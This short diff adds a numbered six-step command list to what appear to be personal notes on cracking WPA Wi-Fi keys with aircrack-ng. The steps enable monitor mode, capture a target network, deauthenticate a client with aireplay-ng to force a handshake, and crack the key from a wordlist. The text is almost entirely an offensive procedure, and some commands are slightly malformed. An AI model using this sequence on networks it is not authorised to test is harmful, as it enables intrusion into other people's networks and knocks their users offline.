@@ -13,3 +13,13 @@ Once we have the handshake "WPA handshake : xxxxxxxxx" mesage in TERM1, stop the
 --> TERM1 # CTL+c
 --> TERM1 # aircrack-ng  <fileName_wpa_handshake.cap> -w <wordList>
 
+
+
+
+1 #iwconfig
+2 #airmon-ng start wlan0
+3 #airodump-ng mon0
+4 #airodump-ng -c 3 --bssid <bssid> -w <FileName3>
+5 aireplay-ng -0 1 -a <bssid> -c <host_mac> mon0
+6 aircrack-ng -0 -w psk-crack-dictionary FileName3.cap
+
